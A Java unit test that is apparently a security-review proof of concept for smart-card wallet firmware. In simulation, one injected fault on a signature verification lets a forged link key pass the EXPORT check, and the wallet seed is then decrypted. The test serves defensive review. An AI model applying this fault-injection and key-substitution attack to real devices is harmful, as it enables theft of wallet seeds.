// SPDX-FileCopyrightText: 2026 QuantX
// SPDX-License-Identifier: AGPL-3.0-or-later
package org.qntx.card.review;

import static org.junit.jupiter.api.Assertions.*;
import static org.qntx.card.review.ReviewHost.*;

import java.math.BigInteger;
import org.junit.jupiter.api.Test;
import org.qntx.card.review.ReviewSession.Inner;
import org.qntx.card.sim.Fault;

/**
 * PoC (review): EXPORT P1=0x00 authenticates the target's offer with a single coded evaluation of
 * the offer signature check (§9.13 check 5: {@code Verify(A_T, "qntx-card/v1/offer" ‖ LK_T,
 * sig_T)}). One laser on that evaluation — here simulated by arming the woven {@code
 * Secp256k1.verifyHash} call site to return CHECK_OK — lets an attacker substitute its own link key
 * LK_T while presenting the certificate of a genuine member: EXPORT P1=0x01 then releases the
 * wallet seed encrypted under keys the attacker derives from its own link private key. The
 * certificate and the membership entry are genuine — the single fault defeats only the
 * offer-signature check, a suspected single point of failure.
 *
 * <p>The test asserts the faulty behaviour on the current code: with the fault armed the card
 * answers 9000 to both EXPORT commands and the host recovers the exact 64-byte seed; without it
 * EXPORT P1=0x00 is refused 6A80.
 */
final class SpofExportOfferSignatureTest {

    private static final byte[] S0 =
            unhex(
                    "00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF"
                            + "00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF");
    private static final byte[] H0 = sha256("review access hash H0".getBytes());
    private static final byte[] HT = sha256("review access hash HT".getBytes());
    private static final byte[] GARBAGE_SIG = sha512("not a signature".getBytes());
    private static final short CHECK_OK = (short) 0x6666;

    private static final class Rig {
        ReviewCard c;
        ReviewSession s;
        FakeMember m;
    }

    /** Card X in L2: members = (ID(A_X), ID(A_M)), session verified with H0. */
    private static Rig rig() {
        Rig r = new Rig();
        r.c = ReviewCard.uninitialised();
        r.c.blank();
        r.m = new FakeMember(ReviewCard.CA);
        r.s = r.c.create(S0, H0, r.m.cardId); // session left verified by CREATE (§9.4)
        return r;
    }

    private static byte[] export0Command(ReviewCard c, FakeMember m, byte[] lkT, byte[] sigT) {
        return concat(m.cert, lkT, sigT);
    }

    @Test
    void controlWithoutFault() {
        Rig r = rig();
        try {
            BigInteger attLink = randomScalar();
            byte[] attLK = uncomp(g().multiply(attLink));
            Inner res =
                    r.s.cmd(
                            (byte) 0x41,
                            (byte) 0x00,
                            (byte) 0,
                            export0Command(r.c, r.m, attLK, GARBAGE_SIG));
            assertEquals(0x6A80, res.sw, "control: forged offer must be refused 6A80");
        } finally {
            Fault.reset();
        }
    }

    @Test
    void seedExfiltrationByOneVerifyHashFault() {
        Rig r = rig();
        try {
            // dry run with a genuine offer to learn the call index of the sig_T verification
            Fault.countCalls();
            Inner ok = r.s.cmd((byte) 0x41, (byte) 0x00, (byte) 0, r.m.exportRequest());
            assertEquals(0x9000, ok.sw, "dry-run genuine offer");
            int calls = Fault.calls("Secp256k1.verifyHash");
            assertTrue(calls >= 2, "expected ≥2 verifyHash calls, saw " + calls);
            // inside EXPORT P1=0x00 the second verifyHash evaluates sig_T (call 1 is the
            // certificate check; a third is the sig_S self-verification) — see call order in
            // the command's §9.13 check sequence
            int sigTIndex = 2;
            Fault.reset();

            // consume the pending export so the armed run starts clean
            Inner done = r.s.cmd((byte) 0x41, (byte) 0x01, (byte) 0, HT);
            assertEquals(0x9000, done.sw);

            BigInteger attLink = randomScalar();
            byte[] attLK = uncomp(g().multiply(attLink));
            Fault.arm("Secp256k1.verifyHash", sigTIndex, CHECK_OK);
            Inner e0 =
                    r.s.cmd(
                            (byte) 0x41,
                            (byte) 0x00,
                            (byte) 0,
                            export0Command(r.c, r.m, attLK, GARBAGE_SIG));
            Fault.reset();
            assertEquals(
                    0x9000,
                    e0.sw,
                    "one verifyHash fault must pass the forged offer (observed "
                            + String.format("%04X", e0.sw)
                            + ")");
            assertEquals(129, e0.data.length);
            byte[] eph = slice(e0.data, 0, 65);
            byte[] sigS = slice(e0.data, 65, 64);
            byte[] exportM = concat(LABEL_EXPORT, r.s.cardA, r.m.a, attLK, eph);
            assertTrue(
                    ecdsaVerify(r.s.cardA, exportM, sigS),
                    "sig_S over the export message must verify under A");

            Inner e1 = r.s.cmd((byte) 0x41, (byte) 0x01, (byte) 0, HT);
            assertEquals(0x9000, e1.sw, "EXPORT P1=0x01");
            assertEquals(160, e1.data.length, "ct ‖ tag for c = 2");

            // the attacker holds the link private key: K_te ‖ K_tm and the payload are its
            byte[] z = ecdhX(attLink, eph);
            byte[] payload = FakeMember.unsealRecord(z, exportM, e1.data);
            assertNotNull(payload, "attacker decrypts the export record");
            assertEquals(130, payload.length);
            assertEquals(0x02, payload[0] & 0xFF, "origin = imported (CREATE P1=0x01)");
            assertArrayEquals(S0, slice(payload, 1, 64), "the 64-byte seed left the card");
            assertArrayEquals(HT, slice(payload, 65, 32));
            assertEquals(0x02, payload[97] & 0xFF, "c = 2");
            assertArrayEquals(cardId(r.s.cardA), slice(payload, 98, 16));
            assertArrayEquals(r.m.cardId, slice(payload, 114, 16));
        } finally {
            Fault.reset();
        }
    }
}
